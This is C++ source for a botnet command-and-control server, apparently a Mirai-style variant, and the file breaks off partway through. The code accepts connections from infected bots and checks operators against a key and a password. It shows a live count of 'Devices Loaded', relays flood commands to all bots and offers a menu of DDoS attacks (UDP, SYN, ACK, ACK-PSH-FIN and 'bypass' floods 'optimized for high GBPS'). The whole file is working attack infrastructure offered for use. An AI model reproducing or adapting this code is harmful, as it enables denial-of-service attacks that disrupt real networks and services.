#include <iostream>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <thread>
#include <map>
#include <sstream>
#include <string>
#include <unistd.h>
#include <sys/epoll.h>
#include <errno.h>
#include <string.h>
#include <vector>
#include <iterator>
//#include <pthread.h>

#include "main.h"
#include "client.h"
#include "admin.h"
#include "command.h"
#include "thread.h"

static void terminate_client(int fd)
{
    epoll_ctl(efd, EPOLL_CTL_DEL, client_list[fd].fd, NULL);
    if(client_list[fd].fd != -1)
    {
        close(client_list[fd].fd);
    }
    client_list[fd].fd = -1;
    client_list[fd].connected = FALSE;
    client_list[fd].addr = 0;
    client_list[fd].authenticated = FALSE;
    client_list[fd].timeout = 0;
    client_list[fd].arch_len = 0;
    memset(client_list[fd].arch, 0, sizeof(client_list[fd].arch));
    return;
}

static void _exit(const char *str, int exit_code)
{
    std::cout << str << std::endl;
    exit(exit_code);
}

static void admin_bind(void)
{
    struct sockaddr_in addr;
    int ret = 0;
    admin_fd = socket(AF_INET, SOCK_STREAM, 0);
    if(!admin_fd)
    {
        _exit("Failed to create a TCP socket", 1);
    }
    addr.sin_family = AF_INET;
    addr.sin_port = htons(ADMIN_PORT);
    addr.sin_addr.s_addr = INADDR_ANY;
    NONBLOCK(admin_fd);
    REUSE_ADDR(admin_fd);
    ret = bind(admin_fd, (struct sockaddr *)&addr, sizeof(addr));
    if(ret)
    {
        _exit("Failed to bind to the admin port", 1);
    }
    ret = listen(admin_fd, 0);
    if(ret)
    {
        _exit("Failed to listen on the admin port", 1);
    }
    return;
}

static void kill_self(struct process *process)
{
    int x = 0;
    int c = 0;
    struct relay data;
    data.type = TYPE_KILL;
    for(x = 0; x < MAX_EVENTS; x++)
    {
        if(!client_list[x].authenticated || !client_list[x].connected)
        {
            continue;
        }
        send(client_list[x].fd, &data, sizeof(data), MSG_NOSIGNAL);
        c++;
        if(process->count != -1 && c == process->count)
        {
            break;
        }
    }
    return;
}

static void delete_dup(int fd)
{

    int x = 0;
    int c = 0;
    struct relay data;
    data.type = TYPE_KILL;
    send(fd, &data, sizeof(data), MSG_NOSIGNAL);
    return;
}

static void accept_client_connection(struct epoll_event *es, int efd)
{
    int fd = -1;
    struct sockaddr_in addr;
    socklen_t addr_len = sizeof(addr);
    struct epoll_event e;
    int ret = 0;
    int count = 0;
    struct process process;
    fd = accept(es->data.fd, (struct sockaddr *)&addr, &addr_len);
    if(fd == -1)
    {
        return;
    }
    e.data.fd = fd;
    e.events = EPOLLIN | EPOLLET;
    ret = epoll_ctl(efd, EPOLL_CTL_ADD, fd, &e);
    if(ret)
    {
        return;
    }
    client_list[e.data.fd].addr = addr.sin_addr.s_addr;
    client_list[e.data.fd].fd = e.data.fd;
    for (count = 0; count < MAX_EVENTS; count++)
    {
        if(!client_list[count].connected || count == e.data.fd)
        {
            continue;
        }
        if(client_list[count].addr == client_list[e.data.fd].addr)
        {
            //printf("\033[37;1m[\033[33;1m~\033[37;1m] (\033[33;1m%d\033[37;1m.\033[33;1m%d\033[37;1m.\033[33;1m%d\033[37;1m.\033[33;1m%d\033[37;1m) removed due to duplicate ip\033[33;1m!\033[0m\n", client_list[e.data.fd].addr & 0xff, (client_list[e.data.fd].addr >> 8) & 0xff, (client_list[e.data.fd].addr >> 16) & 0xff, (client_list[e.data.fd].addr >> 24) & 0xff);
            delete_dup(client_list[e.data.fd].fd);
            client_list[e.data.fd].fd = -1;
            break;
        }
    }
    if(client_list[e.data.fd].fd == -1)
    {
        return;
    }
    client_list[e.data.fd].connected = TRUE;
    client_list[e.data.fd].authenticated = FALSE;
    client_list[e.data.fd].timeout = time(NULL);
    client_list[e.data.fd].arch_len = 0;
    memset(client_list[e.data.fd].arch, 0, sizeof(client_list[e.data.fd].arch));
    //printf("\033[37;1m[\033[32;1m+\033[37;1m] (\033[32;1m%d\033[37;1m.\033[32;1m%d\033[37;1m.\033[32;1m%d\033[37;1m.\033[32;1m%d\033[37;1m) Connection accepted\033[32;1m!\033[0m\n", client_list[e.data.fd].addr & 0xff, (client_list[e.data.fd].addr >> 8) & 0xff, (client_list[e.data.fd].addr >> 16) & 0xff, (client_list[e.data.fd].addr >> 24) & 0xff);
    return;
}

static int parse_count(struct process *process)
{
    int count = 0;
    int x = 0;
    std::stringstream stream;
    std::string out;
    std::string n;
    stream << process->buf;
    std::getline(stream, out, ' ');
    n = out;
    process->f = process->buf;
    process->f.erase(0, n.length() + 1);
    n.erase(0, 1);
    count = stoi(n);
    if(count == 0 || (process->ptr->max_clients == -1 && count == -1) || (process->ptr->max_clients != -1 && count > process->ptr->max_clients))
    {
        return 0;
    }
    process->count = count;
    return 1;
}

static void flood(struct command *ptr, struct process *process)
{
    int x = 0;
    int c = 0;
    struct relay data;
    data.type = TYPE_FLOOD;
    memset(data.buf, 0, sizeof(data.buf));
    memcpy(data.buf, ptr->buf, ptr->buf_len);
    for(x = 0; x < MAX_EVENTS; x++)
    {
        if(!client_list[x].authenticated || !client_list[x].connected)
        {
            continue;
        }
        send(client_list[x].fd, &data, sizeof(data), MSG_NOSIGNAL);
        c++;
        if(process->count != -1 && c == process->count)
        {
            break;
        }
    }
    return;
}

static std::map<std::string, int> statistics(void)
{
    int i = 0;
    std::map<std::string, int> t;
    for(i = 0; i < MAX_EVENTS; i++)
    {
        if(!client_list[i].authenticated || !client_list[i].connected)
        {
            continue;
        }
        t[client_list[i].arch]++;
    }
    return t;
}

int client_count(int max_clients)
{
    int i = 0;
    int x = 0;
    for(i = 0; i < MAX_EVENTS; i++)
    {
        if(!client_list[i].authenticated || !client_list[i].connected)
        {
            continue;
        }
        if(max_clients != -1 && x == max_clients)
        {
            break;
        }
        x++;
    }
    return x;
}

void *title_counter(void *arg)
{
    struct admin *login = (struct admin *)arg;
    struct admin p;
    while(TRUE)
    {
        std::stringstream title;
        title << "\033]0;Devices Loaded: " << client_count(p.max_clients) << "\007";
        send(login->fd, title.str().c_str(), title.str().length(), MSG_NOSIGNAL);
        sleep(1);
    }
}

static std::tuple<int, std::string> recv_line(int fd)
{
    int ret = 0;
    std::string str;
    while(1)
    {
        int np = 0;
        int rp = 0;
        char out[4096];
        memset(out, 0, sizeof(out));
        ret = recv(fd, out, sizeof(out), MSG_NOSIGNAL);
        if(ret <= 0)
        {
            return std::tuple<int, std::string>(ret, str);
        }
        str = out;
        np = str.find("\n");
        rp = str.find("\r");
        if(np != -1)
        {
            str.erase(np);
        }
        if(rp != -1)
        {
            str.erase(rp);
        }
        if(str.length() == 0)
        {
            continue;
        }
        break;
    }
    return std::tuple<int, std::string>(ret, str);
}

static void *admin_timeout_thread(void *arg)
{
    struct thread_data *tdata = (struct thread_data *)arg;
    pthread_barrier_wait(tdata->barrier);
    while(TRUE)
    {
        if(tdata->time + tdata->timeout < time(NULL))
        {
            close(tdata->fd);
            pthread_cancel(*tdata->admin_thread);
            break;
        }
        sleep(1);
    }
    pthread_exit(0);
}

int fdgets(char *buffer, int bufferSize, int fd)
{
    int total = 0, got = 1;
    while(got == 1 && total < bufferSize && *(buffer + total - 1) != '\n')
    { 
        got = read(fd, buffer + total, 1);
        total++;
    }
    return got;
}

void trim(char *str)
{
    int i;
    int begin = 0;
    int end = strlen(str) - 1;
    while (isspace(str[begin])) begin++;
    while ((end >= begin) && isspace(str[end])) end--;
    for (i = begin; i <= end; i++) str[i - begin] = str[i];
    str[i - begin] = '\0';
}

static void *admin(void *arg)
{
    int fd = -1;
    std::stringstream stream;
    pthread_t counter;
    char user[4096];
    char pass[4096];
	/*
    char banner1[1024];
    char banner2[1024];
    char banner3[1024];
    char banner4[1024];
    char banner5[1024];
    char banner6[1024];
	*/
    struct admin login;
    int ffd = -1;
    char bbuf[4096];
    int load = 0;
    struct thread_data *tdata = (struct thread_data *)arg;
    struct thread_data t;
    pthread_barrier_t barrier;
    pthread_t admin_timeout;
    int ex = 0;
    int ret = 0;
    std::string banner;
    int np = 0;
    int rp = 0;
    std::tuple<int, std::string> line;
    pthread_barrier_wait(tdata->barrier);
    fd = tdata->fd;
    pthread_barrier_init(&barrier, NULL, 1);
    send(fd, "\033[2J\033[H", 8, MSG_NOSIGNAL);
    t.fd = fd;
    t.time = time(NULL);
    t.barrier = &barrier;
    t.admin_thread = tdata->admin_thread;
    t.timeout = 60;
    pthread_create(&admin_timeout, NULL, admin_timeout_thread, (void *)&t);
    pthread_barrier_wait(&barrier);
    pthread_barrier_destroy(&barrier);
    line = recv_line(fd);
    if(std::get<int>(line) <= 0)
    {
        close(fd);
        pthread_cancel(admin_timeout);
        pthread_exit(0);
    }
    if(strcmp(std::get<std::string>(line).c_str(), MANAGER_AUTH_KEY))
    {
        close(fd);
        pthread_cancel(admin_timeout);
        pthread_exit(0);
    }
    char const *defaultbanner = "We in this bitch!";
    sprintf(login.banner, "%s", defaultbanner);
    std::stringstream banner_stream;
    banner_stream << "\r" << login.banner;
    banner_stream << "\r\n";
    send(fd, banner_stream.str().c_str(), banner_stream.str().length(), MSG_NOSIGNAL);
    send(fd, "username: ", strlen("username: "), MSG_NOSIGNAL);
    line = recv_line(fd);
    if(std::get<int>(line) <= 0)
    {
        close(fd);
        pthread_cancel(admin_timeout);
        pthread_exit(0);
    }
    memcpy(user, std::get<std::string>(line).c_str(), std::get<std::string>(line).length());
    send(fd, "password: \033[8m", strlen("password: \033[8m"), MSG_NOSIGNAL);
    line = recv_line(fd);
    if(std::get<int>(line) <= 0)
    {
        close(fd);
        pthread_cancel(admin_timeout);
        pthread_exit(0);
    }
    memcpy(pass, std::get<std::string>(line).c_str(), std::get<std::string>(line).length());
    login.user_ptr = user;
    login.pass_ptr = pass;
    send(fd, "\033[0mverification of credentials", strlen("\033[0mverification of credentials"), MSG_NOSIGNAL);
    for(load = 0; load < 5; load++)
    {
        send(fd, "\033[38;5;118m.\033[0m", strlen("\033[38;5;118m.\033[0m"), MSG_NOSIGNAL);
        sleep(1);
    }
    send(fd, "\r\n", 2, MSG_NOSIGNAL);
    if(!admin_login(&login))
    {
        send(fd, "\033[0mauthentication failed\033[38;5;196m!\033[0m\r\n", strlen("\033[0mauthentication failed\033[38;5;196m!\033[0m\r\n"), MSG_NOSIGNAL);
        close(fd);
        pthread_cancel(admin_timeout);
        pthread_exit(0);
    }
    send(fd, "\033[0maccess is allowed\033[38;5;118m; \033[0mstart command and control", strlen("\033[0maccess is allowed\033[38;5;118m; \033[0mstart command and control"), MSG_NOSIGNAL);
    for(load = 0; load < 3; load++)
    {
        send(fd, "\033[38;5;118m.\033[0m", strlen("\033[38;5;118m.\033[0m"), MSG_NOSIGNAL);
        sleep(1);
    }
    send(fd, "\r\n", 2, MSG_NOSIGNAL);
    pthread_cancel(admin_timeout);
	
	/*

    sprintf(banner1,  "\033[38;5;145m███████╗ █████╗ ████████╗ ██████╗ ██████╗ ██╗\r\n");
	sprintf(banner2,  "\033[38;5;145m██╔════╝██╔══██╗╚══██╔══╝██╔═══██╗██╔══██╗██║\r\n");
	sprintf(banner3,  "\033[38;5;145m███████╗███████║   ██║   ██║   ██║██████╔╝██║\r\n");
	sprintf(banner4,  "\033[38;5;145m╚════██║██╔══██║   ██║   ██║   ██║██╔══██╗██║\r\n");
	sprintf(banner5,  "\033[38;5;145m███████║██║  ██║   ██║   ╚██████╔╝██║  ██║██║\r\n");
	sprintf(banner6,  "\033[38;5;145m╚══════╝╚═╝  ╚═╝   ╚═╝    ╚═════╝ ╚═╝  ╚═╝╚═╝\r\n");

    send(fd, banner1, strlen(banner1), MSG_NOSIGNAL);
    send(fd, banner2, strlen(banner2), MSG_NOSIGNAL);
    send(fd, banner3, strlen(banner3), MSG_NOSIGNAL);
    send(fd, banner4, strlen(banner4), MSG_NOSIGNAL);
    send(fd, banner5, strlen(banner5), MSG_NOSIGNAL);
    send(fd, banner6, strlen(banner6), MSG_NOSIGNAL);
	*/
	
	send(fd, "goldfishgang!\r\n", 15, MSG_NOSIGNAL);
	
	

    login.fd = fd;
    char const *defaultprompt = "botnet";
    sprintf(login.prompt, "%s", defaultprompt);
    pthread_create(&counter, NULL, title_counter, (void *)&login);
    while(TRUE)
    {
        char buf[4096];
        struct process process;
        struct command *ptr;
        int x = 0;
        std::string data;
        int g = 0;
        int np = 0;
        int rp = 0;
        int count = 0;
        memset(buf, 0, sizeof(buf));
        count = client_count(login.max_clients);
		std::stringstream prompt_stream;
        prompt_stream << "\r\033[37;1m" << count;
        prompt_stream << "\033[38;5;220m@\033[37;1m" << login.prompt;
        prompt_stream << "\033[38;5;220m:~$\033[0m ";
        ret = send(fd, prompt_stream.str().c_str(), prompt_stream.str().length(), MSG_NOSIGNAL);
        if(ret <= 0)
        {
            break;
        }
        g = recv(fd, buf, sizeof(buf), MSG_NOSIGNAL);
        if(g <= 0)
        {
            break;
        }
        data = buf;
        np = data.find("\n");
        rp = data.find("\r");
        if(np != -1)
        {
            data.erase(np);
        }
        if(rp != -1)
        {
            data.erase(rp);
        }
        if(data == "")
        {
            continue;
        }
        if(data == "?")
        {
            send(fd, "\033[37;1mudpflood\033[38;5;220m:\033[37;1m UDP flood optimized for high GBPS\033[38;5;220m\r\n", strlen("\033[37;1mudpflood\033[38;5;220m:\033[37;1m UDP flood optimized for high GBPS\033[38;5;220m\r\n"), MSG_NOSIGNAL);
            send(fd, "\033[37;1mackflood\033[38;5;220m:\033[37;1m ACK flood optimized for high GBPS\033[38;5;220m\r\n", strlen("\033[37;1mackflood\033[38;5;220m:\033[37;1m ACK flood optimized for high GBPS\033[38;5;220m\r\n"), MSG_NOSIGNAL);
            send(fd, "\033[37;1msynflood\033[38;5;220m:\033[37;1m SYN flood optimized for high GBPS\033[38;5;220m\r\n", strlen("\033[37;1msynflood\033[38;5;220m:\033[37;1m SYN flood optimized for high GBPS\033[38;5;220m\r\n"), MSG_NOSIGNAL);
            send(fd, "\033[37;1mudpplain\033[38;5;220m:\033[37;1m UDP flood optimized for high PPS\033[38;5;220m\033[38;5;220m\r\n", strlen("\033[37;1mudpplain\033[38;5;220m:\033[37;1m UDP flood optimized for high PPS\033[38;5;220m\033[38;5;220m\r\n"), MSG_NOSIGNAL);
            send(fd, "\033[37;1msynplain\033[38;5;220m:\033[37;1m SYN flood optimized for high PPS\033[38;5;220m\033[38;5;220m\r\n", strlen("\033[37;1msynplain\033[38;5;220m:\033[37;1m SYN flood optimized for high PPS\033[38;5;220m\033[38;5;220m\r\n"), MSG_NOSIGNAL);
            send(fd, "\033[37;1mackplain\033[38;5;220m:\033[37;1m ACK flood optimized for high PPS\033[38;5;220m\033[38;5;220m\r\n", strlen("\033[37;1mackplain\033[38;5;220m:\033[37;1m ACK flood optimized for high PPS\033[38;5;220m\033[38;5;220m\r\n"), MSG_NOSIGNAL);
            send(fd, "\033[37;1mackpsh\033[38;5;220m:\033[37;1m ACK-PSH-FIN flood optimized for high PPS\033[38;5;220m\r\n", strlen("\033[37;1mackpsh\033[38;5;220m:\033[37;1m ACK-PSH-FIN flood optimized for high PPS\033[38;5;220m\r\n"), MSG_NOSIGNAL);
            send(fd, "\033[37;1msynack\033[38;5;220m:\033[37;1m SYN-ACK flood optimized for high PPS\033[38;5;220m\r\n", strlen("\033[37;1msynack\033[38;5;220m:\033[37;1m SYN-ACK flood optimized for high PPS\033[38;5;220m\r\n"), MSG_NOSIGNAL);
            send(fd, "\033[37;1mbypass\033[38;5;220m:\033[37;1m UDP flood optimized for bypassing\033[38;5;220m\r\n", strlen("\033[37;1mbypass\033[38;5;220m:\033[37;1m UDP flood optimized for bypassing\033[38;5;220m\r\n"), MSG_NOSIGNAL);
            continue;
        }
        if(data == "help")
        {
            send(fd, "\033[37;1mhelp\033[38;5;220m:\033[37;1m displays this\033[38;5;220m.\r\n", strlen("\033[37;1mhelp\033[38;5;220m:\033[37;1m displays this\033[38;5;220m.\r\n"), MSG_NOSIGNAL);
            send(fd, "\033[37;1m?\033[38;5;220m:\033[37;1m displays floods\033[38;5;220m.\r\n", strlen("\033[37;1m?\033[38;5;220m:\033[37;1m displays floods\033[38;5;220m.\r\n"), MSG_NOSIGNAL);
            send(fd, "\033[37;1mprompt\033[38;5;220m:\033[37;1m allows you to change the prompt\033[38;5;220m.\r\n", strlen("\033[37;1mprompt\033[38;5;220m:\033[37;1m allows you to change the prompt\033[38;5;220m.\r\n"), MSG_NOSIGNAL);
            send(fd, "\033[37;1mbanner\033[38;5;220m:\033[37;1m allows you to change the banner\033[38;5;220m.\r\n", strlen("\033[37;1mbanner\033[38;5;220m:\033[37;1m allows you to change the banner\033[38;5;220m.\r\n"), MSG_NOSIGNAL);
            send(fd, "\033[37;1mclear\033[38;5;220m/\033[37;1mcls\033[38;5;220m/\033[37;1mwipe\033[38;5;220m:\033[37;1m clears the screen\033[38;5;220m.\r\n", strlen("\033[37;1mclear\033[38;5;220m/\033[37;1mcls\033[38;5;220m/\033[37;1mwipe\033[38;5;220m:\033[37;1m clears the screen\033[38;5;220m.\r\n"), MSG_NOSIGNAL);
            send(fd, "\033[37;1mbots\033[38;5;220m/\033[37;1mbotcount\033[38;5;220m/\033[37;1mstats\033[38;5;220m:\033[37;1m displays count\033[38;5;220m.\r\n", strlen("\033[37;1mbots\033[38;5;220m/\033[37;1mbotcount\033[38;5;220m/\033[37;1mstats\033[38;5;220m:\033[37;1m displays count\033[38;5;220m.\r\n"), MSG_NOSIGNAL);
            send(fd, "\033[37;1mbotkill\033[38;5;220m:\033[37;1m kills current processes\033[38;5;220m.\r\n", strlen("\033[37;1mbotkill\033[38;5;220m:\033[37;1m kills current processes\033[38;5;220m.\r\n"), MSG_NOSIGNAL);
            continue;
        }
        if(data == "prompt")
        {
            send(fd, "\033[37;1mPrompt\033[38;5;220m:\033[0m ", strlen("\033[37;1mPrompt\033[38;5;220m:\033[0m "), MSG_NOSIGNAL);
            char buffer[32];
            memset(buffer, 0, sizeof(buffer));
            if(fdgets(buffer, sizeof(buffer), fd) < 1)
            {
                send(fd, "\033[37;1mPrompt failed to change\033[38;5;220m!\033[0m\r\n", strlen("\033[37;1mPrompt failed to change\033[38;5;220m!\033[0m\r\n"), MSG_NOSIGNAL);
                continue;
            }
            if(strlen(buffer) > 30)
            {
                send(fd, "\033[37;1mBuffer maxed out\033[38;5;220m!\033[0m\r\n", strlen("\033[37;1mBuffer maxed out\033[38;5;220m!\033[0m\r\n"), MSG_NOSIGNAL);
                continue;
            }
            trim(buffer);
            if(strstr(buffer, "default"))
            {
                char msg[1024];
                sprintf(msg, "\033[37;1mPrompt changed back to defualt\033[38;5;220m!\r\n");
                send(fd, msg, strlen(msg), MSG_NOSIGNAL);
                memset(login.prompt, 0, sizeof(login.prompt));
                sprintf(login.prompt, "%s", "botnet");
                continue;
            }
            char msg[1024];
            sprintf(msg, "\033[37;1mPrompt changed to\033[38;5;220m: \x1b[37;1m%s\033[38;5;220m!\r\n", buffer);
            send(fd, msg, strlen(msg), MSG_NOSIGNAL);
            memset(login.prompt, 0, sizeof(login.prompt));
            sprintf(login.prompt, "%s", buffer);
            continue;
        }
        if(data == "banner")
        {
            send(fd, "\033[37;1mBanner\033[38;5;220m:\033[0m ", strlen("\033[37;1mBanner\033[38;5;220m:\033[0m "), MSG_NOSIGNAL);
            char buffer[64];
            memset(buffer, 0, sizeof(buffer));
            if(fdgets(buffer, sizeof(buffer), fd) < 1)
            {
                send(fd, "\033[37;1mBanner failed to change\033[38;5;220m!\033[0m\r\n", strlen("\033[37;1mBanner failed to change\033[38;5;220m!\033[0m\r\n"), MSG_NOSIGNAL);
                continue;
            }
            trim(buffer);
            if(strlen(buffer) > 60)
            {
                send(fd, "\033[37;1mBuffer maxed out\033[38;5;220m!\033[0m\r\n", strlen("\033[37;1mBuffer maxed out\033[38;5;220m!\033[0m\r\n"), MSG_NOSIGNAL);
                continue;
            }
            if(strstr(buffer, "default"))
            {
                char msg[1024];
                sprintf(msg, "\033[37;1mBanner changed back to defualt\033[38;5;220m!\r\n");
                send(fd, msg, strlen(msg), MSG_NOSIGNAL);
                memset(login.banner, 0, sizeof(login.banner));
                sprintf(login.banner, "%s", "We in this bitch!");
                continue;
            }
            char msg[1024];
            sprintf(msg, "\033[37;1mBanner changed to\033[38;5;220m: \x1b[37;1m%s\033[38;5;220m!\r\n", buffer);
            send(fd, msg, strlen(msg), MSG_NOSIGNAL);
            memset(login.banner, 0, sizeof(login.banner));
            sprintf(login.banner, "%s", buffer);
            continue;
        }
        if(data == "clear")
        {
            send(fd, "\033[2J\033[H", 8, MSG_NOSIGNAL);
            //send(fd, "⠀⠀⠀⠀⠀⠀⣿\e[38;5;89m⢏\e[38;5;125m⣾⣿\e[38;5;89m⣿⡿\e[38;5;242m⣀\e[38;5;96m⣿\e[38;5;251m⣾\e[38;5;255m⣿\e[38;5;145m⣿\e[38;5;255m⣿\e[38;5;252m⣿\e[38;5;246m⣿\e[38;5;247m⣿\e[38;5;188m⣿\e[38;5;255m⣿\e[38;5;7m⣿\e[38;5;250m⣿\e[38;5;253m⣿\e[38;5;139m⣿\e[38;5;145m⣿\e[38;5;96m⣿\e[38;5;95m⣷\e[38;5;89m⡽⣦\e[38;5;88m⢆\e[38;5;125m⠙\e[38;5;89m⡄\e[38;5;125m⢸⣿⣾⣿⣶\e[38;5;89m⡣⠻⣿\e[38;5;125m⣿⣿⣿\e[38;5;238m⡀⠀⠀⠀⠀⠀\033[0m\r\n", strlen("⠀⠀⠀⠀⠀⠀⣿\e[38;5;89m⢏\e[38;5;125m⣾⣿\e[38;5;89m⣿⡿\e[38;5;242m⣀\e[38;5;96m⣿\e[38;5;251m⣾\e[38;5;255m⣿\e[38;5;145m⣿\e[38;5;255m⣿\e[38;5;252m⣿\e[38;5;246m⣿\e[38;5;247m⣿\e[38;5;188m⣿\e[38;5;255m⣿\e[38;5;7m⣿\e[38;5;250m⣿\e[38;5;253m⣿\e[38;5;139m⣿\e[38;5;145m⣿\e[38;5;96m⣿\e[38;5;95m⣷\e[38;5;89m⡽⣦\e[38;5;88m⢆\e[38;5;125m⠙\e[38;5;89m⡄\e[38;5;125m⢸⣿⣾⣿⣶\e[38;5;89m⡣⠻⣿\e[38;5;125m⣿⣿⣿\e[38;5;238m⡀⠀⠀⠀⠀⠀\033[0m\r\n"), MSG_NOSIGNAL);
    		//send(fd, "⠀⠀⠀⠀⠀\e[38;5;95m⢠⠣\e[38;5;89m⣾⢿⢿⣟\e[38;5;96m⣿\e[38;5;250m⣿\e[38;5;254m⣿\e[38;5;255m⣿⣿\e[38;5;242m⣿\e[38;5;250m⣿\e[38;5;15m⣿\e[38;5;7m⣿\e[38;5;245m⣿\e[38;5;249m⣿\e[38;5;253m⣿\e[38;5;252m⣿\e[38;5;251m⣿\e[38;5;255m⣿\e[38;5;181m⣿\e[38;5;252m⣿\e[38;5;145m⣿\e[38;5;245m⣿\e[38;5;102m⡇\e[38;5;237m⠈\e[38;5;89m⠛⢷\e[38;5;124m⣆⠀\e[38;5;125m⢿⢟⡻\e[38;5;124m⣿\e[38;5;125m⣿\e[38;5;89m⣇⠙\e[38;5;89m⣿⣹⣿⡀⠀⠀⠀⠀⠀\033[0m\r\n", strlen("⠀⠀⠀⠀⠀\e[38;5;95m⢠⠣\e[38;5;89m⣾⢿⢿⣟\e[38;5;96m⣿\e[38;5;250m⣿\e[38;5;254m⣿\e[38;5;255m⣿⣿\e[38;5;242m⣿\e[38;5;250m⣿\e[38;5;15m⣿\e[38;5;7m⣿\e[38;5;245m⣿\e[38;5;249m⣿\e[38;5;253m⣿\e[38;5;252m⣿\e[38;5;251m⣿\e[38;5;255m⣿\e[38;5;181m⣿\e[38;5;252m⣿\e[38;5;145m⣿\e[38;5;245m⣿\e[38;5;102m⡇\e[38;5;237m⠈\e[38;5;89m⠛⢷\e[38;5;124m⣆⠀\e[38;5;125m⢿⢟⡻\e[38;5;124m⣿\e[38;5;125m⣿\e[38;5;89m⣇⠙\e[38;5;89m⣿⣹⣿⡀⠀⠀⠀⠀⠀\033[0m\r\n"), MSG_NOSIGNAL);
    		//send(fd, "⠀⠀⠀⠀⠀\e[38;5;95m⣄\e[38;5;89m⢕⠿\e[38;5;239m⣶\e[38;5;96m⣾\e[38;5;245m⣿\e[38;5;145m⣿\e[38;5;255m⣿\e[38;5;15m⣿\e[38;5;250m⣿\e[38;5;188m⣿\e[38;5;246m⣿\e[38;5;251m⣿⣿\e[38;5;145m⣿\e[38;5;241m⣿\e[38;5;249m⣿\e[38;5;146m⣿\e[38;5;181m⣿\e[38;5;252m⣿\e[38;5;255m⣿\e[38;5;182m⣿\e[38;5;253m⣿\e[38;5;252m⣿\e[38;5;250m⣿\e[38;5;245m⣧⠀⠀⠀\e[38;5;89m⠘⠧⣀\e[38;5;88m⠺\e[38;5;89m⣋\e[38;5;125m⣾⣿⣿⣧⡀\e[38;5;89m⡍⡻\e[38;5;95m⣗⠀⠀⠀⠀⠀\033[0m\r\n", strlen("⠀⠀⠀⠀⠀\e[38;5;95m⣄\e[38;5;89m⢕⠿\e[38;5;239m⣶\e[38;5;96m⣾\e[38;5;245m⣿\e[38;5;145m⣿\e[38;5;255m⣿\e[38;5;15m⣿\e[38;5;250m⣿\e[38;5;188m⣿\e[38;5;246m⣿\e[38;5;251m⣿⣿\e[38;5;145m⣿\e[38;5;241m⣿\e[38;5;249m⣿\e[38;5;146m⣿\e[38;5;181m⣿\e[38;5;252m⣿\e[38;5;255m⣿\e[38;5;182m⣿\e[38;5;253m⣿\e[38;5;252m⣿\e[38;5;250m⣿\e[38;5;245m⣧⠀⠀⠀\e[38;5;89m⠘⠧⣀\e[38;5;88m⠺\e[38;5;89m⣋\e[38;5;125m⣾⣿⣿⣧⡀\e[38;5;89m⡍⡻\e[38;5;95m⣗⠀⠀⠀⠀⠀\033[0m\r\n"), MSG_NOSIGNAL);
    		//send(fd, "⠀⠀⠀⠀\e[38;5;89m⢠⣾⠏⠀\e[38;5;242m⣿\e[38;5;243m⣿\e[38;5;252m⣿\e[38;5;255m⣿\e[38;5;248m⣿\e[38;5;252m⣿\e[38;5;7m⣾\e[38;5;246m⣿\e[38;5;247m⣿\e[38;5;181m⣿\e[38;5;252m⣿\e[38;5;249m⣿\e[38;5;252m⣿\e[38;5;246m⣿\e[38;5;103m⣾\e[38;5;181m⣿\e[38;5;188m⣿\e[38;5;7m⣿\e[38;5;181m⣿\e[38;5;254m⣿\e[38;5;250m⣿\e[38;5;249m⣿\e[38;5;240m⣿\e[38;5;52m⡀⠀⠀⠀⠀⠀\e[38;5;89m⠑\e[38;5;53m⢄\e[38;5;125m⠻⣿⣿⣿\e[38;5;124m⣷\e[38;5;52m⢃\e[38;5;89m⢻⡑\e[38;5;95m⠁⠀⠀⠀⠀\033[0m\r\n", strlen("⠀⠀⠀⠀\e[38;5;89m⢠⣾⠏⠀\e[38;5;242m⣿\e[38;5;243m⣿\e[38;5;252m⣿\e[38;5;255m⣿\e[38;5;248m⣿\e[38;5;252m⣿\e[38;5;7m⣾\e[38;5;246m⣿\e[38;5;247m⣿\e[38;5;181m⣿\e[38;5;252m⣿\e[38;5;249m⣿\e[38;5;252m⣿\e[38;5;246m⣿\e[38;5;103m⣾\e[38;5;181m⣿\e[38;5;188m⣿\e[38;5;7m⣿\e[38;5;181m⣿\e[38;5;254m⣿\e[38;5;250m⣿\e[38;5;249m⣿\e[38;5;240m⣿\e[38;5;52m⡀⠀⠀⠀⠀⠀\e[38;5;89m⠑\e[38;5;53m⢄\e[38;5;125m⠻⣿⣿⣿\e[38;5;124m⣷\e[38;5;52m⢃\e[38;5;89m⢻⡑\e[38;5;95m⠁⠀⠀⠀⠀\033[0m\r\n"), MSG_NOSIGNAL);
    		//send(fd, "⠀⠀⠀⠀\e[38;5;95m⡛\e[38;5;89m⠁⠀\e[38;5;255m⣴\e[38;5;245m⣽\e[38;5;250m⣿\e[38;5;252m⣿\e[38;5;254m⣿\e[38;5;251m⣿\e[38;5;249m⣿⣿\e[38;5;246m⣿\e[38;5;247m⠿\e[38;5;181m⡛\e[38;5;247m⠛⠛\e[38;5;145m⠛\e[38;5;245m⣻\e[38;5;8m⣿\e[38;5;252m⣿\e[38;5;254m⣿\e[38;5;249m⣿\e[38;5;181m⣿\e[38;5;188m⣿\e[38;5;250m⣿\e[38;5;252m⣿\e[38;5;132m⡿\e[38;5;89m⣧\e[38;5;53m⠘\e[38;5;89m⣴⢀\e[38;5;89m⠑⠀⠀\e[38;5;237m⠔\e[38;5;89m⢅⠘\e[38;5;125m⢿⣿⣿\e[38;5;89m⣧⢸⠉\e[38;5;132m⡙⠀⠀⠀⠀\033[0m\r\n", strlen("⠀⠀⠀⠀\e[38;5;95m⡛\e[38;5;89m⠁⠀\e[38;5;255m⣴\e[38;5;245m⣽\e[38;5;250m⣿\e[38;5;252m⣿\e[38;5;254m⣿\e[38;5;251m⣿\e[38;5;249m⣿⣿\e[38;5;246m⣿\e[38;5;247m⠿\e[38;5;181m⡛\e[38;5;247m⠛⠛\e[38;5;145m⠛\e[38;5;245m⣻\e[38;5;8m⣿\e[38;5;252m⣿\e[38;5;254m⣿\e[38;5;249m⣿\e[38;5;181m⣿\e[38;5;188m⣿\e[38;5;250m⣿\e[38;5;252m⣿\e[38;5;132m⡿\e[38;5;89m⣧\e[38;5;53m⠘\e[38;5;89m⣴⢀\e[38;5;89m⠑⠀⠀\e[38;5;237m⠔\e[38;5;89m⢅⠘\e[38;5;125m⢿⣿⣿\e[38;5;89m⣧⢸⠉\e[38;5;132m⡙⠀⠀⠀⠀\033[0m\r\n"), MSG_NOSIGNAL);
